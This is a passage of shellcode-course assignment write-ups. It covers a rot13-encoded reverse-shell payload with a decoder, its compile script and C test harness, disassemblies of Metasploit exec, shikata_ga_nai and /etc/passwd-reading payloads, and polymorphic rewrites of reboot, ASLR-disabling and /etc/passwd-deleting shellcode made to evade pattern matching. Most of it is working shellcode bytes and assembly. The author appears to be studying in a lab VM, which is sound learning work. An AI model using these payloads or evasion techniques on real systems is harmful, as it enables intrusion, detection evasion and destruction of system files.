	EncodedShellcode: db 0x3e,0xcd,0xbd,0x73,0x3e,0xe8,0xc0,0x0e,0x3e,0xd6,0x5e,0x60,0x77,0x0f,0x96,0xee,0xda,0x8d,0x3e,0x0c,0x96,0xd4,0x3e,0xcd,0xbd,0x73,0x3e,0xd6,0xc6,0x8d,0x0e,0x0e,0x0f,0x8e,0xf6,0x0e,0x0e,0x0e,0x0e,0x5e,0x73,0x75,0x1e,0x69,0x50,0x73,0x60,0x96,0xee,0x77,0x1d,0x5e,0x64,0x96,0xee,0x50,0xda,0x8d,0x3e,0xd6,0xbe,0x0f,0x3e,0xcd,0xbd,0x4c,0xda,0x8d,0x56,0x86,0x06,0x3e,0xcd,0xbd,0x18,0x3e,0xe8,0x60,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x3e,0xd6,0x3e,0xdf,0xda,0x8d
```

## Compiling our custom encoder/decoder

So if you're not aware we can't just run assembly from the file, it first needs to be compile and then linked.

During my testing I went ahead and created a file that foes all this along with dumping the shellcode of the compiled file. Please use it to compile your assembly file:
```
# This compiles your assembly code and dumps the shellcode 

# Compile and output
nasm -f elf32 -o $1.o $1.asm; ld -d -o $1 $1.o

# Gets shellcode from output file

## Prints the shellcode in little endian

RAW=$(objdump -d "$1" -M intel | grep "^ "|awk -F"[\t]" '{print $2}')
SHELLCODE=""
COUNT=0
for word in $RAW
do
	SHELLCODE=${SHELLCODE}${word:6:2}${word:4:2}${word:2:2}${word:0:2}
	((COUNT++))
done
echo ""
echo "Shellcode: "
echo $SHELLCODE | sed 's/ //g'| sed 's/.\{2\}/\\x&/g'|paste -d '' -s
echo "Shellcode size: ${COUNT} bytes"
```


You then pass the name (NOT INCLUDING EXTENSION) as an argument to the bash file to compile and link it like so:
```
root@ubuntu:/mnt/hgfs/assembly/exam/4-Assignment# ./compile-shell-dump.sh rot13-decoder

Shellcode: 
\xeb\x24\x5e\x31\xc9\xb1\x60\x80\x3e\x0d\x7c\x05\x80\x2e\x0d\xeb\x10\x31\xd2\xb2\x0d\x2a\x16\x31\xdb\xb3\xff\x43\x66\x29\xd3\x88\x1e\x46\xe2\xe3\xeb\x05\xe8\xd7\xff\xff\xff\x3e\xcd\xbd\x73\x3e\xe8\xc0\x0e\x3e\xd6\x5e\x60\x77\x0f\x96\xee\xda\x8d\x3e\x0c\x96\xd4\x3e\xcd\xbd\x73\x3e\xd6\xc6\x8d\x0e\x0e\x0f\x8e\xf6\x0e\x0e\x0e\x0e\x5e\x73\x75\x1e\x69\x50\x73\x60\x96\xee\x77\x1d\x5e\x64\x96\xee\x50\xda\x8d\x3e\xd6\xbe\x0f\x3e\xcd\xbd\x4c\xda\x8d\x56\x86\x06\x3e\xcd\xbd\x18\x3e\xe8\x60\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x3e\xd6\x3e\xdf\xda\x8d
Shellcode size: 139 bytes
```


Now we'll take the dumped shellcode and place it in a C file, we do this to confirm it works in a C program.
```
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x24\x5e\x31\xc9\xb1\x60\x80\x3e\x0d\x7c\x05\x80\x2e\x0d\xeb\x10\x31\xd2\xb2\x0d\x2a\x16\x31\xdb\xb3\xff\x43\x66\x29\xd3\x88\x1e\x46\xe2\xe3\xeb\x05\xe8\xd7\xff\xff\xff\x3e\xcd\xbd\x73\x3e\xe8\x60\x50\x60\x77\x0f\x96\xee\xda\x8d\x3e\x03\x96\xd3\xbd\x73\x68\x67\x3e\xdf\x5f\x73\x75\x1e\x69\x77\x1d\x5e\x63\x96\xee\xda\x8d\xbd\x73\xc0\x11\x63\x3e\xd6\x96\xee\xda\x8d\xbd\x73\xc0\x12\x63\x96\xee\xda\x8d\x3e\xe8\x96\xd0\x3e\xd6\xbe\x0f\xbd\x4c\xda\x8d\x56\x86\x06\x3e\xcd\xbd\x18\x3e\xe8\x60\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x3e\xd6\xda\x8d";

main(){

	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();

```

Once that's done we're going to need to compile it:
```
root@ubuntu:/mnt/hgfs/assembly/exam/4-Assignment/# gcc -fno-stack-protector -z execstack testingShellcode.c -o testingShellcode
```

And we're done!

# Testing our custom encoder/decoder

To test it we'll first open up a new terminal and open a socket to listen on our local (127.0.0.1) IP and port 4444:

```
root@ubuntu:/home/ubuntu# nc -v -l 4444
```

Now go back to your original terminal and execute your compiled C file:

```
root@ubuntu:/mnt/hgfs/assembly/exam/4-Assignment/testShellcode# ./testingShellcode
Shellcode Length: 139

```

Now if we go back to our socket listener you'll see we have a reverse shell connection!

Our custom encoder/decoder worked!

```
root@ubuntu:/home/ubuntu# nc -v -l 4444
Connection from 127.0.0.1 port 4444 [tcp/*] accepted
id
uid=0(root) gid=0(root) groups=0(root)

```

I hope you've enjoyed learning about custom encoders/decoders and implementing them in assembly!



# Assignment 5
# MSF Analysis Requirements
- Take up at least 3 shellcode samples created using Msfpayload for linux/x86
- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
- Present your analysis

## Context

For this assignment we are going to dissect three different shellcodes generated with metasploit. Cool right ? It might allow us to diversify our opcodes knowledge and find new pattern and tricks in assembly!

## Standard exec shellcode with CMD= 
First, we start with a simple yet well known payload, linux/x86/exec. Generate it with msfvenom -p linux/86/exec -f raw CMD="echo SLAEisrad" > msfcmd.raw

Then you can disassemble it with ndisasm -u msfcmd.raw.

I will provide analysis directly inside the disassembly. If you want to run it or analyse it dynamically you can export it to elf format with -f elf and run it with gdb or libemu.
```
; lets disassemble 
ndisasm -u msfcmd.raw 
00000000  6A0B              push byte +0xb ; push 11 which corresponds to syscall execve 
00000002  58                pop eax ; put pushed 11 into eax 
00000003  99                cdq ; this artifact put 0 into edx and is shorter than xor, kinda cool  
00000004  52                push edx ; push 0 
00000005  66682D63          push word 0x632d ; push "-c" for "/bin/sh -c" 
00000009  89E7              mov edi,esp ; push pointer to this string in edi
0000000B  682F736800        push dword 0x68732f ; push "/sh" , it contains null byte by default so we need to instruct msf to avoid it next time :] 
00000010  682F62696E        push dword 0x6e69622f ; push "/bin"
00000015  89E3              mov ebx,esp ; move the pointer to this string "/bin/sh" to ebx 
00000017  52                push edx ; push 0 again 
00000018  E80F000000        call dword 0x2c; call function at +0x44 bytes , so the rest of the ndisasm is wrong 
; call function push the return address onto the stack, its a trick to have a pointer to the following string 
; and the following string at 0x18 +4(this instruction is 4 bytes) +1(return address) is   

p 0x18+4+1
$1 = 0x1d
p/u 0x1d
$2 = 29
; i always misscompute :] 

hd -s 29  msfcmd.raw 
0000001d  65 63 68 6f 20 53 4c 41  45 69 73 72 61 64 00 57  |echo SLAEisrad.W|
[...] 

; lets disassemble the remaining part 
ndisasm -u -e 44 msfcmd.raw 
00000000  57                push edi ; push the pointer to "-c" 
00000001  53                push ebx ; push the pointer to "/bin/sh" 
00000002  89E1              mov ecx,esp ; put this list of args into ecx for syscall execve 
00000004  CD80              int 0x80 ; syscall interupt 

;lets verify the syscall
execve("/bin/sh", ["/bin/sh", "-c", "echo SLAEisrad"], NULL) = 0
;done 
```


## Shikata_ga_nai
As I am willing to understand polymorphic virus and encoders, I take this exercise as an opportunity to analyse shikata_ga_nai. We will generate the exact same shellcode as previously but this time encoded with the famous encoder.

Generate it (using only one round) with :

msfvenom -p linux/86/exec -c 1 -e shikata_ga_nai -f raw CMD="echo SLAEisrad" > shikatamsfcmd.raw

Now lets see what is this encoder doing... As a sidenote you can have a better "view" in disassembly using libemu compared to gdb.
```
; SLAE-970
; thanks to previous students write ups 
; assignment 5.2: analyse metasploit shellcodes
; originality: lets deal with infamous shikata ga nai encryption !!! 
; msfvenom -p linux/x86/exec -e x86/shikata_ga_nai -c 1 -f raw CMD="echo SLAEisrad" > msfcmdshikata.raw

The most accurate disassembly is dynamic analysis, because instructions are decrypted on the fly !   
so lets analyse this in gdb (or libemu if you want) 
WARNING: do not run untrusted shellcode in gdb before analyzing them securely first  

gdb$ x/20i $eip 
=> 0x8048054:   mov    edi,0x1e1d3ccf ;  mov edx,0x9b4fd75e ; mov a random number into edx, changes everytime
   0x8048059:   fxch   st(0) ; static disas show "fld st(2)" instruction however,
; dynamic exec shows that is  fxch st(0), exchange st0 with st2, see under;
; before
; st0            0      (raw 0x00000000000000000000)
; after
; st0            -nan(0xc000000000000000)       (raw 0xffffc000000000000000)
   0x804805b:   fnstenv [esp-0xc] ; this instruction loads eip (env) into the stack 
   0x804805f:   pop    edx; edx now contains eip, 0x08048059
   0x8048060:   sub    ecx,ecx ; this means zero minus zero i dont understand its usage, useless op ? 
   0x8048062:   mov    cl,0xd ; put 13 into ecx for looping xor, decrypt 13 * 4 bytes 
;loop starts here  
   0x8048064:   sub    edx,0xfffffffc ; remove -4 (+4) from eip so now 0x0804805D
   0x8048067:   xor    DWORD PTR [edx+0x10],edi ; decrypt the shellcode at 0x0804805D+0x10 (6D) with random key 
   0x804806a:   add    edi,DWORD PTR [edx+0x10] ; add the result to the key (chained mode encryption) 

REMARK : the above 2 instructions will always stay equivalent
but will be polymorphic !! 
it means each time you generate a shellcode, it will vary but does the same 
example other generation : 
example other gen: 00000010  315614            xor [esi+0x14],edx; now this use edx and esi and different size (0x14) 
example other gen: 00000013  035614            add edx,[esi+0x14]; still chained though 

the next OP was wrong 0x804806d:        sub    eax,0xe91577c9 ; it needs to be decrypted first 
; with decryption it transforms to 
 0x804806d:     loop   0x8048064 ; makes more sense now :] 
; loop ends here 

We continue to analyse after decryption 
lets break after decryption and read instructions 
gdb$ x/20i $eip
It is way more standard stuff now, its exactly the same as assignment 5.1 
=> 0x804806f:   push   0xb ; push 13 
   0x8048071:   pop    eax ; put 13 into eax, execve syscall  
   0x8048072:   cdq   ; 
   0x8048073:   push   edx ; 
   0x8048074:   pushw  0x632d ; "-c" 
   0x8048078:   mov    edi,esp ; 
   0x804807a:   push   0x68732f ; "/sh" 
Interestingly this was containing null byte decrypted previously
but in encrypted format null byte was avoided, double usage of encryption 
   0x804807f:   push   0x6e69622f "/bin" 
   0x8048084:   mov    ebx,esp  
   0x8048086:   push   edx
   0x8048087:   call   0x804809b ; we see the call trick again, push next instruction pointer to stack 
; which contains the payload of "/bin/sh -c" 
; proof : 
cx/1s 0x804808c
c0x804808c:      "echo SLAEisrad"

; syscall finally 
gdb$ x/4i 0x804809b
   0x804809b:   push   edi ; push ptr to "-c"
   0x804809c:   push   ebx ; push ptr to "/bin/sh" 
   0x804809d:   mov    ecx,esp ; move pointer to arguments in ecx  
   0x804809f:   int    0x80 ; execve  
```

As a conclusion one round of  shikata ga nai does : 
1. elect a random number for key 
2. use XOR for encrypt / decrypt with various registers and size 
3. decrypt the upcoming instructions with this key and seed with the result for next decryption 


Remarks: 
This is what ndisasm, static disassembly, shows for second instruction :  
00000005  D9C2              fld st2 ; why fld instead of fxch st(0) , needs to figure out why  
This Gist brought to you by gist-it.view rawas5/analysismsf2.txt


Alright. Job done. Shikata_ga_nai is encoding the shellcode with a XOR with random key using different instructions but which create the same decoding in the end.





## Readfile
We need to progress in linux/x86 so lets check another msf shellcode with more syscalls and analyze it.

```
; SLAE-970
; thanks to previous students write ups 
; assignment 5.3: analyse metasploit shellcodes
; originality: lets check syscall for readfile 
; msfvenom -p linux/x86/readfile -f raw PATH="/etc/passwd" > msfcmdread.raw

; here are the syscalls used by this shellcode: open,read,write 

; first it jumps to 0x38 
00000000  EB36              jmp short 0x38 ; jump

; the following is syscall open 
00000002  B805000000        mov eax,0x5; prepare the open syscall
; here is the function 
; int open(const char *pathname, int flags);
00000007  5B                pop ebx ; the string is inside the ebx register 
00000008  31C9              xor ecx,ecx ; 0 as flags, so O_RDONLY 
0000000A  CD80              int 0x80
;cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 5 
;#define __NR_open                5
; open("/etc/passwd", O_RDONLY)           = 3

; the following is syscall read 
0000000C  89C3              mov ebx,eax ; store the resulting fd in ebx 
0000000E  B803000000        mov eax,0x3 ; syscall read 
; #define __NR_read               3
00000013  89E7              mov edi,esp ; stack address to edi 
00000015  89F9              mov ecx,edi ; destination of the read is the stack :] 
00000017  BA00100000        mov edx,0x1000 ; size to 4096 
0000001C  CD80              int 0x80 ; syscall 

; the following is syscall write
; function is ssize_t write(int fd, const void *buf, size_t count); 
0000001E  89C2              mov edx,eax ; result is inside edx, edx is the size  
00000020  B804000000        mov eax,0x4 ; syscal write 
00000025  BB01000000        mov ebx,0x1 ; output to stdout = 1, ebx is fd  
; for info ecx still points to the string read and is argument 2, ecx is the buffer 
0000002A  CD80              int 0x80 ; syscall 

; syscall exit , clean exit 
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80

; jump here 
00000038  E8C5FFFFFF        call dword 0x2 ; call 0x2, and push the return address onto the stack 

; so the following bytes are probably a string, and not random opcodes

0000003D  2F                das [...] ; wrong disass
; surprise surprise :] lets check string 
hd -s 0x3d msfread.raw 
0000003d  2f 65 74 63 2f 70 61 73  73 77 64 00              |/etc/passwd.|
; this is the path we want to open 
```

I hope you've enjoyed learning about malware analysis!



## Context
Have you ever generated shellcode with tools like Metasploit and MSFvenom? 
If you have, I'm sure you've wondered what that shellcode actually translates to beyond the generic descriptor "linux/x86/shell_bind_tcp".

I'm going to teach you how to not only read shellcode, but create your own as well.


## Prerequisites

- Take 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching
- The polymorphic versions cannot be larger than 150% of the existing shellcode
- Bonus points for making it shorter in length than original



## Approach

I have chosen the following 3 shellcodes to make polymorphic from shell-strom.org:

1. reboot
2. disable aslr
3. unlink /etc/passwd and exit

My approach will be to:

- Take each shellcode and analyze it to understand what it does
- Place it in a sample stub c program to try it out to make sure it works before modification
- Modify the shellcode with garbage instructions and equivalent instructions
- Place the modified shellcode into the stub c program and verify that it continues to work properly

## Shellcode 1: Reboot
The shellcode for rebooting a system looks like the following. I have converted the AT&T syntax to Intel but other than that the commands are the same. Lets analyze it and try to understand what it does.
```
global _start
section .text
  _start:
    xor    eax,eax    ; zero out eax
    push   eax        ; place 0x00000000 on the stack
    push   0x746f6f62 ; push toob to the stack
    push   0x65722f6e ; push er/n to the stack
    push   0x6962732f ; push ibs/ to the stack
    mov    ebx,esp    ; place pointer to /sbin/reboot string on stack
    push   eax        ; place 0x00000000 on the stack
    push word 0x662d  ; push f- to the stack
    mov    esi,esp    ; place pointer to -f argument to the stack
    push   eax        ; push 0x00000000 on the stack
    push   esi        ; place pointer to -f argument on the stack
    push   ebx        ; place pointer to /sbin/reboot string on the stack
    mov    ecx,esp    ; move pointer to argument array /sbin/reboot, -f on the stack
    mov    al,0xb     ; place system call 11 (execve) in al
    int    0x80       ; call execve
```

This looks pretty familiar. The shellcode simply populates the registers with the arguments that execve requires:
```
int execve(const char *path, char *const argv[], char *const envp[]);
```
And then executes it. Lets go ahead and throw it in a stub c program and make sure it works but before we do, lets write a little bash function to place in our .bashrc as I’ve grown tired having to derive the proper command line incantation to dump the shellcode of a binary. Here we go:
```
function dumpsc {
  objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
}
Note: if placing shellcode in cstub doesn’t work it may be because the cut -f needs to be adjusted to account for the columns of opcodes in the objdump -d output.
```
Execellent. Now:
```
dumpsc reboot
"\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80"
```
There is our shellcode. Lets throw it in our stub C program. Actually, I’ve grown tired of doing that too. Lets write a function to do that for us:
```
function asmtocstub {
BYTES=`dumpsc $1`
CFILE="$2.c"
echo "The bytes of the shellcode are:"
echo $BYTES
echo "Writing shellcode to $CFILE"
cat << EOF > $CFILE
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = $BYTES;

int main(void)
{

  printf("Shellcode Length:  %d\n", strlen(shellcode));
  int (*ret)() = (int(*)())shellcode;
  ret();
}
EOF
gcc -g -fno-stack-protector -z execstack -m32 $CFILE -o $2
}
```
And now:
```
$ asmtocstub reboot myshellcode
The bytes of the shellcode are:
"\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80"
Writing shellcode to myshellcode.c
$ cat myshellcode.c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{

  printf("Shellcode Length:  %d\n", strlen(shellcode));
  int (*ret)() = (int(*)())shellcode;
  ret();
}
$ ./myshellcode
Length: 36
reboot: Need to be root
$
```
Excellent. That should speed up productivity. We can see from the output that when we execute the shellcode c program that it does in fact try to run (although you need to be root to reboot the system).

Since we know that it works, lets start making it polymorphic.

## Polymorphic Reboot Shellcode
Returning to our original shellcode, replace some instructions with equivalent instructions and add some NOP garbage as well:
```
global _start
section .text
  _start:
    ; zero out eax
    xor    eax,eax

    push   eax        ; place 0x00000000 on the stack

    ;push   0x746f6f62 ; push toob to the stack
    mov ebx, 0x736e6e61 ; place obfuscated toob in ebx
    add ebx, 0x01010101 ; add to bring ebx to 0x746f6f62
    push ebx ; push toob to the stack

    ;push   0x65722f6e ; push er/n to the stack
    ;push   0x6962732f ; push ibs/ to the stack
    mov dword [esp-4],  0x65722f6e ; push er/n to the stack
    mov dword [esp-8], 0x6962732f ; push ibs/ to the stack
    sub esp, 8

    mov    ebx,esp    ; place pointer to /sbin/reboot string on stack
    push   eax        ; place 0x00000000 on the stack
    push word 0x662d  ; push f- to the stack
    mov    esi,esp    ; place pointer to -f argument to the stack
    push   eax        ; push 0x00000000 on the stack
    push   esi        ; place pointer to -f argument on the stack
    push   ebx        ; place pointer to /sbin/reboot string on the stack
    mov    ecx,esp    ; move pointer to argument array /sbin/reboot, -f on the stack

    mov    al,0xb     ; place system call 11 (execve) in al

    int    0x80       ; call execve
Lets compile our new polymorphic reboot version and see if it still works:

$ ./compile.sh polyreboot
[+] Assembling with Nasm ...
[+] Linking ...
[+] Done!
$ ./polyreboot
reboot: Need to be root
$ asmtocstub polyreboot polyrebootstub
The bytes of the shellcode are:
"\x31\xc0\x50\xbb\x61\x6e\x6e\x73\x81\xc3\x01\x01\x01\x01\x53\xc7\x44\x24\xfc\x6e\x2f\x72\x65\xc7\x44\x24\xf8\x2f\x73\x62\x69\x83\xec\x08\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80"
Writing shellcode to polyrebootstub.c
$ ./polyrebootstub
Shellcode Length:  52
reboot: Need to be root
```
After our obfuscation our shellcode still works. Perfect. The size of the shellcode has grown from 36 to 52 bytes. We have kept it under the 150% size increase limitation. Next up…

## Shellcode 2: ASLR Deactivation
The next shellcode disables ASLR on Linux x86 systems. It can be found here. Once again, lets do some analysis before we go and try to run it.
```
global _start
section .text
  _start:
    xor    eax,eax ; Clear out eax
    push   eax     ; Push 0x00000000 onto the stack
    push   0x65636170 ; Push ecap onto the stack
    push   0x735f6176 ; Push s_av onto the stack
    push   0x5f657a69 ; Push _ezi onto the stack
    push   0x6d6f646e ; Push modn onto the stack
    push   0x61722f6c ; Push ar/l onto the stack
    push   0x656e7265 ; Push enre onto the stack
    push   0x6b2f7379 ; Push k/sy onto the stack
    push   0x732f636f ; Push s/co onto the stack
    push   0x72702f2f ; Push rp// onto the stack
    ; At this point //proc/sys/kernel/randomize_va_space
    ; Has been pushed onto the stack
    ; According to [this](http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)
    ; This seems to be the recommended way to be disabling ASLR
    mov    ebx, esp ; place a pointer to our string on the stack

    mov    cx, 0x2bc ; mode for sys_creat call
    ; gdb --batch --ex "print /o 0x02bc" $1 = 01274
    ; consulting the man page table for mode we find
    ; S_IWUSR    00200 user has write permission
    ; S_IRWXG    00070 group has read, write, and execute permission
    ; S_IROTH    00004 others have read permission
    ; S_ISVTX  0001000 sticky bit

    mov    al, 0x8 ; sys_creat - open or create a file
    int    0x80 ; open the file

    mov    ebx,eax ; save the file descriptor
    push   eax ; push the file descriptor onto the stack

    ;; Beginning to setup the write syscall by
    ;; placing the required information into
    ;; the proper registers
    ;; ssize_t write(int fd, const void *buf, size_t count);
    mov    dx,0x3a30  ; Push :0 onto the stack
    push   dx ; push it onto the stack
    mov    ecx,esp
    xor    edx,edx
    inc    edx ; count of bytes to be written which is 1
    mov    al,0x4 ; sys_write syscall
    int    0x80

    mov    al,0x6 ; sys_close syscall
    int    0x80   ; returns 0 into eax on success

    inc    eax  ; increment eax to syscall 1 - exit syscall
    int    0x80 ; exit gracefully
```
Everything seems to look safe to run. Looking at the permissions of /proc/sys/kernel/randomize_va_space we see that it is owned by root and can only be written to by root:
```
$ stat /proc/sys/kernel/randomize_va_space
  File: ‘/proc/sys/kernel/randomize_va_space’
  Size: 0         	Blocks: 0          IO Block: 1024   regular empty file
Device: 4h/4d	Inode: 33315       Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2017-01-08 21:05:46.889201002 -0600
Modify: 2017-01-08 21:39:16.621201002 -0600
Change: 2017-01-08 21:39:16.621201002 -0600
 Birth: -
 ```
This indicates that our shelllcode will need to be run as root to be effective. If we compile and run the shellcode with sudo we see that it in fact does change the randomization value from 2 to 0. Let’s add in some polymorphism and see if we can keep it under 124 bytes as we neet to stay under 150% of the original 83 byte size.

## Polymorphic ASLR Deactivation Shellcode
```
global _start
section .text
  _start:
    xor    eax,eax ; Clear out eax
    push   eax     ; Push 0x00000000 onto the stack

    ; Equivalent instructions for:
    ; push   0x65636170 ; Push ecap onto the stack
    mov ebx, 0x66646271
    sub ebx, 0x01010101
    push ebx

    push   0x735f6176 ; Push s_av onto the stack
    push   0x5f657a69 ; Push _ezi onto the stack
    push   0x6d6f646e ; Push modn onto the stack
    push   0x61722f6c ; Push ar/l onto the stack
    push   0x656e7265 ; Push enre onto the stack
    push   0x6b2f7379 ; Push k/sy onto the stack
    push   0x732f636f ; Push s/co onto the stack

    ; Equivalent instructions for:
    ; push   0x72702f2f ; Push rp// onto the stack
    mov ebx, 0x73713030
    sub ebx, 0x01010101
    push ebx


    ; At this point //proc/sys/kernel/randomize_va_space
    ; Has been pushed onto the stack
    ; According to [this](http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)
    ; This seems to be the recommended way to be disabling ASLR
    mov    ebx, esp ; place a pointer to our string on the stack

    cld ; For funzies

    mov    cx, 0x2bc ; mode for sys_creat call
    ; gdb --batch --ex "print /o 0x02bc" $1 = 01274
    ; consulting the man page table for mode we find
    ; S_IWUSR    00200 user has write permission
    ; S_IRWXG    00070 group has read, write, and execute permission
    ; S_IROTH    00004 others have read permission
    ; S_ISVTX  0001000 sticky bit

    ; Equivalent instructions for:
    ; mov    al, 0x8 ; sys_creat - open or create a file
    mov    al, 0x9
    sub    al, 0x1
    int    0x80 ; open the file

    mov    ebx,eax ; save the file descriptor

    ; Equivalent instructions for:
    ; push   eax ; push the file descriptor onto the stack
    mov [esp-4], eax
    sub esp, 0x4

    ;; Beginning to setup the write syscall by
    ;; placing the required information into
    ;; the proper registers
    ;; ssize_t write(int fd, const void *buf, size_t count);
    mov    dx,0x3a30  ; Push :0 onto the stack
    push   dx ; push it onto the stack
    mov    ecx,esp
    xor    edx,edx

    ; Equivalent instructions for:
    ; inc    edx ; count of bytes to be written which is 1
    inc    edx ; count of bytes to be written which is 1
    inc    edx ; for confusion
    inc    edx ; for confusion
    dec    edx ; for confusion
    dec    edx ; for confusion

    mov    al,0x4 ; sys_write syscall
    int    0x80

    mov    al,0x6 ; sys_close syscall
    int    0x80   ; returns 0 into eax on success

    inc    eax  ; increment eax to syscall 1 - exit syscall
    int    0x80 ; exit gracefully
```
After compiling and running we see:
```
$ cat /proc/sys/kernel/randomize_va_space
2
$ sudo ./deactivateaslrpoly
$ cat /proc/sys/kernel/randomize_va_space
0
```
It still works after the polymorphic adjustments. And the byte count is:
```
$ vim ~/.bashrc
$ ./compile.sh deactivateaslrpoly
[+] Assembling with Nasm ...
[+] Linking ...
[+] Done!

$ asmtocstub deactivateaslrpoly deactivateaslrpolystub
The bytes of the shellcode are:
"\x31\xc0\x50\xbb\x71\x62\x64\x66\x81\xeb\x01\x01\x01\x01\x53\x68\x76\x61\x5f\x73\x68\x69\x7a\x65\x5f\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f\x73\xbb\x30\x30\x71\x73\x81\xeb\x01\x01\x01\x01\x53\x89\xe3\xfc\x66\xb9\xbc\x02\xb0\x09\x2c\x01\xcd\x80\x89\xc3\x89\x44\x24\xfc\x83\xec\x04\x66\xba\x30\x3a\x66\x52\x89\xe1\x31\xd2\x42\x42\x42\x4a\x4a\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80"
Writing shellcode to deactivateaslrpolystub.c
$ ./deactivateaslrpolystub
Shellcode Length:  110
```
Cool. Our byte length is under the 124 byte limit and works as expected!

## Shellcode 3: Unlink /etc/passwd and exit
Now lets work with something a little mischievous. unlink /etc/passwd and exit What is unlink /etc/passwd you ask?
```
unlink
```
unlink, unlinkat - delete a name and possibly the file it refers to
Interesting… So this shellcode will delete the /etcpasswd file. This would probably cause a little havoc on a system. Luckily we are using a vm! Even though we know it is probably going to break our vm, lets analyze the code just to see exactly how it works.

Lets first take the shellcode provided in it’s C form, compile, throw it in gdb and extract the assembly code:
```
=> 0x0804a040 <+0>:	    jmp    0x804a053 <shell+19>
   0x0804a042 <+2>:	    pop    esi
   0x0804a043 <+3>:	    xor    eax,eax
   0x0804a045 <+5>:	    xor    ecx,ecx
   0x0804a047 <+7>:	    xor    edx,edx
   0x0804a049 <+9>:	    mov    al,0xa
   0x0804a04b <+11>:	mov    ebx,esi
   0x0804a04d <+13>:	int    0x80
   0x0804a04f <+15>:	mov    al,0x1
   0x0804a051 <+17>:	int    0x80
   0x0804a053 <+19>:	call   0x804a042 <shell+2>
   0x0804a058 <+24>:	das    
   0x0804a059 <+25>:	gs
   0x0804a05a <+26>:	je     0x804a0bf
   0x0804a05c <+28>:	das    
   0x0804a05d <+29>:	jo     0x804a0c0
   0x0804a05f <+31>:	jae    0x804a0d4
   0x0804a061 <+33>:	ja     0x804a0c7
   0x0804a063 <+35>:	add    BYTE PTR [eax],al
```
So the first thing that jumps out about this shellcode is that it appears to be utilizing the jmp call pop technique.
```
=> 0x0804a040 <+0>:	    jmp    0x804a053 <shell+19>
   0x0804a042 <+2>:	    pop    esi <-- Address after call goes here

   .. snip ..

   0x0804a053 <+19>:	call   0x804a042 <shell+2>
   0x0804a058 <+24>:	das <-- Call places the address of this instruction on the stack

   .. snip ..
```
Ok. So what is this code acquiring the address of? Well, the code after the call seems to be a bit cryptic which could mean that this is actually a string. Lets have a look…

If we put a breakpoint right after the pop call and use x/s $esi we can investigate if a string is pointed to by esi.
```
Breakpoint 5, 0x0804a043 in shell ()
(gdb) disass
Dump of assembler code for function shell:
   0x0804a040 <+0>:	jmp    0x804a053 <shell+19>
   0x0804a042 <+2>:	pop    esi
=> 0x0804a043 <+3>:	xor    eax,eax
   0x0804a045 <+5>:	xor    ecx,ecx
   0x0804a047 <+7>:	xor    edx,edx
   0x0804a049 <+9>:	mov    al,0xa
   0x0804a04b <+11>:	mov    ebx,esi
   0x0804a04d <+13>:	int    0x80
   0x0804a04f <+15>:	mov    al,0x1
   0x0804a051 <+17>:	int    0x80
   0x0804a053 <+19>:	call   0x804a042 <shell+2>
   0x0804a058 <+24>:	das    
   0x0804a059 <+25>:	gs
   0x0804a05a <+26>:	je     0x804a0bf
   0x0804a05c <+28>:	das    
   0x0804a05d <+29>:	jo     0x804a0c0
   0x0804a05f <+31>:	jae    0x804a0d4
   0x0804a061 <+33>:	ja     0x804a0c7
   0x0804a063 <+35>:	add    BYTE PTR [eax],al
End of assembler dump.
(gdb) x/s $esi
0x804a058 <shell+24>:	"/etc/passwd"
```
Sure enough it appears that esi points to the string /etc/passwd. That makes sense as that is the file this code is supposed to unlink.

Ok, continuing with our analysis:
```
   0x0804a042 <+2>:	    pop    esi <- Pointing to /etc/passwd

   ; Clear out registers
   0x0804a043 <+3>:	    xor    eax,eax
   0x0804a045 <+5>:	    xor    ecx,ecx
   0x0804a047 <+7>:	    xor    edx,edx

   ; Move syscall unlink 10 into al
   0x0804a049 <+9>:	    mov    al,0xa

   ; Unlink function signature:
   ; int unlink(const char *pathname);

   ; Move pointer to pathname into ebx
   0x0804a04b <+11>:	mov    ebx,esi

   ; Call unlink
   0x0804a04d <+13>:	int    0x80

   ; Move syscall 1 exit into al
   0x0804a04f <+15>:	mov    al,0x1

   ; Call exit
   0x0804a051 <+17>:	int    0x80
```
So everything is accounted for. This shellcode appears to do exactly what the title says it should do. Lets test it out and see if it in fact deletes the /etc/passwd file…
```
$ sudo cp /etc/passwd /etc/passwd.bkup
